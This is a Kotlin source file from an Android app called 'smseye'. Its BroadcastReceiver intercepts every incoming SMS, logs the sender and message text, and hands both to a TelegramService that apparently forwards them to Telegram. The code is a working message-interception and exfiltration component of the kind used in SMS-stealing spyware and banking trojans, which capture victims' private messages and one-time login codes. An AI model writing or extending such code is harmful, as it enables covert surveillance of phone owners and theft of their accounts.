package com.example.smseye

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (sms in messages) {
                val sender = sms.displayOriginatingAddress
                val messageBody = sms.messageBody
                Log.d("SMS_EYE", "SMS Received from $sender: $messageBody")
                TelegramService.sendSms(sender, messageBody)
            }
        }
    }
}
